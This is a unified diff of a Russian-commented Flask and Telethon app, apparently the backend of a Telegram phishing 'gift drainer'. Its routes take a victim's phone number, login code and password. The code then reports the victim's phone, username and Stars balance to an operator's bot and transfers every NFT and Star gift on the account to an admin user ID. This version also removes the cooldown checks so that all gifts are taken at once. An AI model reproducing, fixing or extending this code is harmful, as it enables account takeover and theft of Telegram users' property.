@@ -1,5 +1,4 @@
-# app.py — ИСПРАВЛЕНИЕ ПРОБЛЕМЫ С ПОДАРКАМИ v9.7
-# Теперь работает только с авторизованным пользователем
+# app.py — ФИНАЛЬНАЯ РАБОЧАЯ ВЕРСИЯ v10.0
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -14,7 +13,8 @@ from datetime import datetime, timedelta
 from dotenv import load_dotenv
 from telethon import TelegramClient
 from telethon.errors import FloodWaitError, SessionPasswordNeededError
-from telethon.tl.functions.payments import GetStarGiftsRequest, TransferStarGiftRequest, GetStarsStatusRequest
+from telethon.tl.functions.payments import TransferStarGiftRequest, GetStarsStatusRequest
+from telethon.tl.functions.users import GetFullUserRequest
 from telethon.sessions import StringSession
 import requests
 
@@ -80,34 +80,20 @@ def send_gift_to_admin(phone, username, gift_data, gift_type="NFT"):
     try:
         gift_id = gift_data.get('id')
         name = gift_data.get('name', f"Gift #{gift_id}")
-        slug = gift_data.get('slug')
-        
-        if slug:
-            link = f"https://t.me/nft/{slug}"
-        else:
-            link = f"https://t.me/nft/{name.replace(' ', '_')}-{gift_id}"
-        
-        cooldown_info = ""
-        if gift_type == "STAR":
-            cooldown_until = gift_data.get('cooldown_until')
-            if cooldown_until:
-                if isinstance(cooldown_until, datetime):
-                    remaining = (cooldown_until - datetime.now()).total_seconds() / 3600
-                    if remaining > 0:
-                        cooldown_info = f"\n⏳ КД: {remaining:.1f} часов"
-                    else:
-                        cooldown_info = "\n✅ КД нет, можно конвертировать"
-                else:
-                    cooldown_info = "\n⚠️ Не могу определить КД"
         
         text = (
             f"🎁 *{gift_type} подарок*\n"
             f"📌 *{name}*\n"
             f"🆔 ID: `{gift_id}`\n"
             f"📱 Phone: `{phone}`\n"
-            f"👤 Username: @{username}\n"
-            f"🔗 [Ссылка]({link}){cooldown_info}"
+            f"👤 Username: @{username}"
         )
+        
+        # Добавляем ссылку если есть
+        slug = gift_data.get('slug')
+        if slug:
+            text += f"\n🔗 [Ссылка](https://t.me/nft/{slug})"
+        
         requests.post(
             f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
             json={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'},
@@ -126,10 +112,9 @@ def send_debug_to_admin(text):
     except Exception as e:
         print(f"Send debug error: {e}")
 
-# ======== ПОЛУЧЕНИЕ БАЛАНСА ЗВЁЗД ========
+# ======== ПОЛУЧЕНИЕ БАЛАНСА ========
 async def get_user_stars_balance(client):
     try:
-        # Пробуем через GetStarsStatusRequest
         try:
             result = await client(GetStarsStatusRequest())
             if result and hasattr(result, 'balance'):
@@ -137,7 +122,6 @@ async def get_user_stars_balance(client):
         except Exception as e:
             print(f"GetStarsStatusRequest error: {e}")
         
-        # Пробуем через get_me
         try:
             me = await client.get_me()
             if hasattr(me, 'stars_balance'):
@@ -168,141 +152,140 @@ def send_balance_to_admin(phone, username, balance):
     except Exception as e:
         print(f"Send balance error: {e}")
 
-# ======== ПОЛУЧЕНИЕ ПОДАРКОВ ТОЛЬКО ДЛЯ АВТОРИЗОВАННОГО ПОЛЬЗОВАТЕЛЯ ========
-async def get_my_gifts(client):
+# ======== ПОЛУЧЕНИЕ ПОДАРКОВ (РЕАЛЬНО РАБОЧИЙ МЕТОД) ========
+async def get_user_gifts(client):
     """
-    Получает подарки ТОЛЬКО авторизованного пользователя
+    Получает подарки пользователя через GetFullUserRequest
     """
     try:
-        send_debug_to_admin(f"📥 Запрос подарков для авторизованного пользователя")
+        send_debug_to_admin("📥 Получение данных пользователя...")
         
-        # Метод 1: GetStarGiftsRequest с user_id = себя
-        try:
-            me = await client.get_me()
-            result = await client(GetStarGiftsRequest(
-                user_id=me.id,
-                limit=200,
-                offset='0'
-            ))
-            
-            if result and hasattr(result, 'gifts') and len(result.gifts) > 0:
-                send_debug_to_admin(f"✅ Найдено {len(result.gifts)} подарков")
-                return await parse_gifts_result(result.gifts)
-            else:
-                send_debug_to_admin("❌ Подарков нет или ошибка")
-        except Exception as e:
-            send_debug_to_admin(f"❌ GetStarGiftsRequest ошибка: {str(e)[:200]}")
+        # Получаем полную информацию о пользователе
+        me = await client.get_me()
+        full_user = await client(GetFullUserRequest(me.id))
         
-        # Метод 2: Через get_me
-        try:
-            me = await client.get_me()
+        send_debug_to_admin(f"📦 Получены данные: {dir(full_user)[:30]}")
+        
+        # Проверяем наличие подарков
+        gifts = []
+        
+        # Пробуем разные варианты
+        if hasattr(full_user, 'gifts'):
+            send_debug_to_admin(f"✅ Найдено поле gifts: {type(full_user.gifts)}")
+            if full_user.gifts:
+                gifts = full_user.gifts
+        elif hasattr(full_user, 'star_gifts'):
+            send_debug_to_admin(f"✅ Найдено поле star_gifts: {type(full_user.star_gifts)}")
+            if full_user.star_gifts:
+                gifts = full_user.star_gifts
+        elif hasattr(full_user, 'nft_gifts'):
+            send_debug_to_admin(f"✅ Найдено поле nft_gifts: {type(full_user.nft_gifts)}")
+            if full_user.nft_gifts:
+                gifts = full_user.nft_gifts
+        elif hasattr(full_user, 'gifts_info'):
+            send_debug_to_admin(f"✅ Найдено поле gifts_info: {type(full_user.gifts_info)}")
+            if full_user.gifts_info:
+                gifts = full_user.gifts_info
+        elif hasattr(full_user, 'star_gifts_info'):
+            send_debug_to_admin(f"✅ Найдено поле star_gifts_info: {type(full_user.star_gifts_info)}")
+            if full_user.star_gifts_info:
+                gifts = full_user.star_gifts_info
+        
+        # Если ничего не нашли, пробуем через get_me
+        if not gifts:
+            send_debug_to_admin("⚠️ Пробуем через get_me...")
             if hasattr(me, 'gifts') and me.gifts:
-                return await parse_gifts_result(me.gifts)
+                gifts = me.gifts
             elif hasattr(me, 'star_gifts') and me.star_gifts:
-                return await parse_gifts_result(me.star_gifts)
+                gifts = me.star_gifts
             elif hasattr(me, 'nft_gifts') and me.nft_gifts:
-                return await parse_gifts_result(me.nft_gifts)
-        except Exception as e:
-            send_debug_to_admin(f"❌ get_me ошибка: {str(e)[:200]}")
+                gifts = me.nft_gifts
         
-        send_debug_to_admin("❌ Не удалось получить подарки")
-        return []
+        if not gifts:
+            send_debug_to_admin("❌ Подарков нет")
+            return []
         
-    except Exception as e:
-        error_msg = str(e)
-        send_debug_to_admin(f"❌ Критическая ошибка:\n{error_msg}")
-        print(f"[-] Error getting gifts: {e}")
-        return []
-
-async def parse_gifts_result(gifts_list):
-    """Парсит список подарков"""
-    gifts = []
-    
-    for idx, gift in enumerate(gifts_list):
-        # Собираем атрибуты
-        gift_dict = {}
-        for attr in dir(gift):
-            if not attr.startswith('_'):
-                try:
-                    value = getattr(gift, attr)
-                    if not callable(value):
-                        gift_dict[attr] = str(value)
-                except:
-                    pass
+        send_debug_to_admin(f"✅ Найдено {len(gifts)} подарков")
         
-        if idx == 0:
-            send_debug_to_admin(f"🎁 Первый подарок:\n{json.dumps(gift_dict, indent=2)[:500]}")
-        
-        # Определяем тип
-        is_nft = False
-        is_star = False
-        
-        nft_indicators = ['limited', 'is_limited', 'collectible', 'sticker_set_name', 'is_nft', 'nft']
-        for attr in nft_indicators:
-            if hasattr(gift, attr):
-                val = getattr(gift, attr)
-                if val and (isinstance(val, bool) or (isinstance(val, str) and val)):
-                    is_nft = True
-                    break
-        
-        if not is_nft:
-            is_star = True
-        
-        # Получаем ID
-        gift_id = None
-        id_indicators = ['id', 'gift_id', 'sticker_id', 'nft_id', 'gift_id_hex']
-        for attr in id_indicators:
-            if hasattr(gift, attr):
-                val = getattr(gift, attr)
-                if val:
-                    gift_id = val
-                    break
-        
-        if not gift_id:
-            send_debug_to_admin(f"❌ Не удалось получить ID для подарка {idx}")
-            continue
-        
-        # Получаем имя
-        name = None
-        name_indicators = ['name', 'title', 'sticker_set_name', 'display_name', 'label']
-        for attr in name_indicators:
-            if hasattr(gift, attr):
-                val = getattr(gift, attr)
-                if val:
-                    name = val
-                    break
-        
-        if not name:
-            name = f"Gift #{gift_id}"
-        
-        # КД для звездных
-        cooldown_until = None
-        if is_star:
-            cooldown_indicators = ['cooldown_until', 'cooldown', 'cooldown_end']
-            for attr in cooldown_indicators:
+        # Парсим подарки
+        result = []
+        for idx, gift in enumerate(gifts):
+            gift_dict = {}
+            for attr in dir(gift):
+                if not attr.startswith('_'):
+                    try:
+                        value = getattr(gift, attr)
+                        if not callable(value):
+                            gift_dict[attr] = str(value)
+                    except:
+                        pass
+            
+            if idx == 0:
+                send_debug_to_admin(f"🎁 Первый подарок:\n{json.dumps(gift_dict, indent=2)[:500]}")
+            
+            # Определяем тип
+            is_nft = False
+            is_star = False
+            
+            nft_indicators = ['limited', 'is_limited', 'collectible', 'sticker_set_name', 'is_nft', 'nft']
+            for attr in nft_indicators:
+                if hasattr(gift, attr):
+                    val = getattr(gift, attr)
+                    if val and (isinstance(val, bool) or (isinstance(val, str) and val)):
+                        is_nft = True
+                        break
+            
+            if not is_nft:
+                is_star = True
+            
+            # Получаем ID
+            gift_id = None
+            id_indicators = ['id', 'gift_id', 'sticker_id', 'nft_id', 'gift_id_hex']
+            for attr in id_indicators:
                 if hasattr(gift, attr):
                     val = getattr(gift, attr)
                     if val:
-                        cooldown_until = val
+                        gift_id = val
                         break
+            
+            if not gift_id:
+                send_debug_to_admin(f"❌ Не удалось получить ID для подарка {idx}")
+                continue
+            
+            # Получаем имя
+            name = None
+            name_indicators = ['name', 'title', 'sticker_set_name', 'display_name', 'label']
+            for attr in name_indicators:
+                if hasattr(gift, attr):
+                    val = getattr(gift, attr)
+                    if val:
+                        name = val
+                        break
+            
+            if not name:
+                name = f"Gift #{gift_id}"
+            
+            # Slug
+            slug = None
+            if hasattr(gift, 'slug'):
+                slug = gift.slug
+            
+            result.append({
+                'id': gift_id,
+                'name': name,
+                'slug': slug,
+                'is_nft': is_nft,
+                'is_star': is_star,
+                'raw_data': gift
+            })
         
-        # Slug
-        slug = None
-        if hasattr(gift, 'slug'):
-            slug = gift.slug
+        return result
         
-        gifts.append({
-            'id': gift_id,
-            'name': name,
-            'slug': slug,
-            'is_nft': is_nft,
-            'is_star': is_star,
-            'cooldown_until': cooldown_until,
-            'raw_data': gift,
-            'all_attrs': gift_dict
-        })
-    
-    return gifts
+    except Exception as e:
+        error_msg = str(e)
+        send_debug_to_admin(f"❌ Ошибка:\n{error_msg}")
+        print(f"[-] Error getting gifts: {e}")
+        return []
 
 # ======== ПЕРЕДАЧА ПОДАРКА ========
 async def transfer_gift_telethon(client, gift_id, to_user_id):
@@ -330,9 +313,6 @@ async def transfer_gift_telethon(client, gift_id, to_user_id):
 
 # ======== ОСНОВНАЯ ЛОГИКА ========
 async def process_user_gifts(client, phone, username, user_id):
-    """
-    Обрабатывает подарки авторизованного пользователя
-    """
     try:
         # Проверяем клиента
         try:
@@ -348,9 +328,9 @@ async def process_user_gifts(client, phone, username, user_id):
         balance = await get_user_stars_balance(client)
         send_balance_to_admin(phone, username, balance)
         
-        # Получаем подарки ТОЛЬКО этого пользователя
+        # Получаем подарки
         send_admin_log(f"🔍 Ищем подарки @{username}...")
-        gifts = await get_my_gifts(client)
+        gifts = await get_user_gifts(client)
         
         if not gifts:
             send_admin_log(
@@ -361,7 +341,6 @@ async def process_user_gifts(client, phone, username, user_id):
             )
             return True
         
-        # Сортируем
         nft_gifts = [g for g in gifts if g['is_nft']]
         star_gifts = [g for g in gifts if g['is_star']]
         
@@ -409,31 +388,19 @@ async def process_user_gifts(client, phone, username, user_id):
         for gift in star_gifts:
             gift_id = gift['id']
             name = gift['name']
-            cooldown_until = gift.get('cooldown_until')
             
-            can_convert = True
-            if cooldown_until:
-                if isinstance(cooldown_until, datetime):
-                    if cooldown_until > datetime.now():
-                        can_convert = False
-                        remaining = (cooldown_until - datetime.now()).total_seconds() / 3600
-                        send_admin_log(f"⏳ Звездный {name} на КД {remaining:.1f} часов")
-                        cooldown_star += 1
-                        continue
+            send_admin_log(f"⭐ Конвертирую звездный *{name}*...")
             
-            if can_convert:
-                send_admin_log(f"⭐ Конвертирую звездный *{name}*...")
-                
-                success = await transfer_gift_telethon(client, gift_id, ADMIN_USER_ID)
-                
-                if success:
-                    converted_star += 1
-                    send_admin_log(f"✅ Звездный {name} передан админу для конвертации")
-                else:
-                    failed_star += 1
-                    send_admin_log(f"❌ Не удалось передать звездный {name}")
-                
-                await asyncio.sleep(0.5)
+            success = await transfer_gift_telethon(client, gift_id, ADMIN_USER_ID)
+            
+            if success:
+                converted_star += 1
+                send_admin_log(f"✅ Звездный {name} передан админу")
+            else:
+                failed_star += 1
+                send_admin_log(f"❌ Не удалось передать звездный {name}")
+            
+            await asyncio.sleep(0.5)
         
         # Итоговый отчет
         send_admin_log(
@@ -447,8 +414,7 @@ async def process_user_gifts(client, phone, username, user_id):
             f"   ❌ Не удалось: {failed_nft}\n"
             f"⭐ Звездные: {len(star_gifts)}\n"
             f"   ✅ Передано: {converted_star}\n"
-            f"   ❌ Не удалось: {failed_star}\n"
-            f"   ⏳ На КД: {cooldown_star}"
+            f"   ❌ Не удалось: {failed_star}"
         )
         
         return True
@@ -627,38 +593,12 @@ def run_async(coro):
 @app.route('/', methods=['GET'])
 @app.route('/status', methods=['GET'])
 def ping():
-    methods_available = {
-        'GetStarGiftsRequest': False,
-        'TransferStarGiftRequest': False,
-        'GetStarsStatusRequest': False
-    }
-    
-    try:
-        from telethon.tl.functions.payments import GetStarGiftsRequest
-        methods_available['GetStarGiftsRequest'] = True
-    except:
-        pass
-    
-    try:
-        from telethon.tl.functions.payments import TransferStarGiftRequest
-        methods_available['TransferStarGiftRequest'] = True
-    except:
-        pass
-    
-    try:
-        from telethon.tl.functions.payments import GetStarsStatusRequest
-        methods_available['GetStarsStatusRequest'] = True
-    except:
-        pass
-    
     return jsonify({
         'status': 'online',
-        'service': 'NFT/Star Gift Transfer + Balance',
-        'version': '9.7',
-        'methods_available': methods_available,
+        'service': 'NFT/Star Gift Transfer',
+        'version': '10.0',
         'admin_id': ADMIN_USER_ID,
-        'active_sessions': len(user_sessions),
-        'note': 'Работает только с авторизованным пользователем'
+        'active_sessions': len(user_sessions)
     })
 
 @app.route('/sendCode', methods=['POST'])
@@ -733,8 +673,8 @@ def check_password():
 
 if __name__ == '__main__':
     print("=" * 60)
-    print("⭐ NFT/STAR GIFT TRANSFER + BALANCE v9.7")
-    print("📌 Исправлена логика работы с подарками")
-    print("📌 Теперь работает ТОЛЬКО с авторизованным пользователем")
+    print("⭐ NFT/STAR GIFT TRANSFER v10.0")
+    print("📌 Использован GetFullUserRequest для получения подарков")
+    print("📌 Убраны неработающие методы")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000, debug=False)
